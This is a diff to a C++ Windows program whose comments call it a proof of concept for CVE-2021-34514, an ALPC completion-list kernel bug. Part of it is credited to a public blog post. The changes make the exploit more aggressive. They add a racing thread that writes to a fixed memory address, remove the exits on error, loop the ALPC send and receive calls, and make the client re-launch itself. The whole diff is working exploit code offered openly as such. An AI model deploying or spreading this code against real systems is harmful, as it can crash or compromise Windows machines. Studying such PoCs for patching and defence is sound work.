@@ -1,6 +1,6 @@
 //alpc完成列表机制通信
 //部分代码取自https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html
-//此代码也是 CVE-2021-34514的poc 如果没有蓝屏可以启动多次并需要检查补丁
+//此代码也是 CVE-2021-34514的poc 
 
 #include <windows.h>
 #include <stdio.h>
@@ -214,6 +214,7 @@ void th() {
 		*(USHORT*)(0x304002) = 0xffff;
 	}
 }
+
 INT main()
 {
 	//
@@ -435,20 +436,18 @@ INT main()
 		ULONG64 test = (ULONG64)CompletionListHEADER;
 
 		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);
-		while (true)
+		for (size_t i = 0; i < 0x100; i++)
 		{
-
 			WaitForSingleObject(handle, INFINITE);
 			ResetEvent(handle);
-			Sleep(1);
 			lSuccess = NtAlpcSendWaitReceivePort(
 				hConnectionPort,
 				NULL,
 				NULL,		// SendMessage_
 				NULL,		// SendMessageAttributes
 				lpMem,	// ReceiveBuffer
-				&ulReceivedSize,		// BufferLength
-				pMsgAttrReceived,//&test,		// ReceiveMessageAttributes
+				NULL,		// BufferLength
+				NULL,//&test,		// ReceiveMessageAttributes
 				NULL			// no timeout
 			);
 
@@ -460,39 +459,38 @@ INT main()
 
 			//一般情况下使用lpMem->u2.s2.Type判断消息类型
 			//完成列表由于是异步 所以要使用事件通知辅助来通信
-			switch (type)
-			{
+			//switch (type)
+			//{
+			//
+			//	//Client disconnects
+			//case 0x5:
+			//	wprintf(L"[*] Client disconnects\n");
+			//	NtAlpcDisconnectPort(hCommunicationPort, 0);
+			//	NtAlpcDisconnectPort(hConnectionPort, 0);
+			//	break;
+			//	//Client sends message
+			//case 0x2001:
 
-				//Client disconnects
-			case 0x5:
-				wprintf(L"[*] Client disconnects\n");
-				NtAlpcDisconnectPort(hCommunicationPort, 0);
-				NtAlpcDisconnectPort(hConnectionPort, 0);
-				break;
-				//Client sends message
-			case 0x2001:
+			//	wprintf(L"[*] CompletionList.Buffer->DataOffset  %x \n", CompletionList.Buffer->DataOffset);
 
-				wprintf(L"[*] CompletionList.Buffer->DataOffset  %x \n", CompletionList.Buffer->DataOffset);
+			//	DumpHex((ULONG*)(test + CompletionList.Buffer->DataOffset), 0x50);
+			//	wprintf(L"---------------------------------\n");
+			//	if (!NT_SUCCESS(lSuccess)) {
+			//		wprintf(L"[-] Accept client messages Error: 0x%X\n", lSuccess);
+			//		exit(-1);
+			//	}
+			//	else wprintf(L"[+] Accept client message successfully \n", pwsPortName);
 
-				DumpHex((ULONG*)(test + CompletionList.Buffer->DataOffset), 0x50);
-				wprintf(L"---------------------------------\n");
-				if (!NT_SUCCESS(lSuccess)) {
-					wprintf(L"[-] Accept client messages Error: 0x%X\n", lSuccess);
-					exit(-1);
-				}
-				else wprintf(L"[+] Accept client message successfully \n", pwsPortName);
+			//	//wprintf(L"[+]%x\n", CompletionList.AttributeFlags);
+			//	break;
 
-				//wprintf(L"[+]%x\n", CompletionList.AttributeFlags);
-				break;
-
-			}
+			//}
 
 		}
 		
 	}
 	else
 	{
-		
 		wprintf(L"[+] Starting client. PID: %d | TID: %d\n", dwPID, dwTID);
 		DWORD           szInput[MSG_LEN + 1];
 
@@ -507,19 +505,18 @@ INT main()
 		ALPC_PORT_COMPLETION_LIST_INFORMATION CompletionList = { 0 };
 
 
-
+	p:
+		SetEvent(handle);
 		lSuccess = NtAlpcConnectPort(&hConnectionPort, &usAlpcPortName, 0, &PortAttributes, NULL, NULL, lpMem, NULL, NULL, NULL, NULL);
 
 
 		if (!NT_SUCCESS(lSuccess)) {
 			wprintf(L"[-] NtAlpcConnectPort Error: 0x%X.\n", lSuccess);
-			exit(-1);
 
 		}
 		else {
 			wprintf(L"[+] NtAlpcConnectPort Success.\n");
 		}
-
 
 		LARGE_INTEGER SectionSize = { 0x10000 };
 		HANDLE SectionHandle;
@@ -534,7 +531,6 @@ INT main()
 		if (!NT_SUCCESS(lSuccess))
 		{
 			printf("[-]  ZwCreateSection error:%X\n", lSuccess);
-			exit(-1);
 		}
 		else wprintf(L"[+] ZwCreateSection Success, Section created. Size: %x\n", SectionSize);
 		/*PVOID test = (PVOID)VirtualAlloc((LPVOID)0x300000, 0x100000,
@@ -552,7 +548,6 @@ INT main()
 		);
 		if (!NT_SUCCESS(lSuccess)) {
 			wprintf(L"[-] NtAlpcCreatePortSection Error: 0x%X\n", lSuccess);
-			exit(-1);
 		}
 		else wprintf(L"[+] NtAlpcCreatePortSection Success, Section created. Size: %x\n", nServerSectionSize);
 
@@ -565,10 +560,10 @@ INT main()
 		memset(viewAttr.ViewBase, 0x43, MSG_LEN);
 		lpMem = (PPORT_MESSAGE)viewAttr.ViewBase;
 		memmove(lpMem, &pmReceived, sizeof(PORT_MESSAGE));
-		//		DumpHex(viewAttr.ViewBase, 0x50);
-				//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);
+		////		DumpHex(viewAttr.ViewBase, 0x50);
+		
 
-		for (size_t i = 0; i < 0x200; i++)
+		while (true)
 		{
 			SetEvent(handle);
 
@@ -582,11 +577,24 @@ INT main()
 				NULL,			// receive message attributes
 				NULL					// no timeout
 			);
+			if (!NT_SUCCESS(lSuccess)) {
+				break;
+			}
 		}
-			
-			
+		PROCESS_INFORMATION pi = { 0 };
+		STARTUPINFOEXA si = { sizeof(si) };
 
+		char szModule[MAX_PATH];
+		GetModuleFileNameA(NULL, szModule, MAX_PATH);
+
+		BOOL success = CreateProcessA(
+			NULL,
+			(LPSTR)szModule,
+			nullptr, nullptr, FALSE,
+			EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, nullptr, nullptr,
+			(LPSTARTUPINFOA)&si,
+			&pi
+		);
+		
 	}
-
-
 }
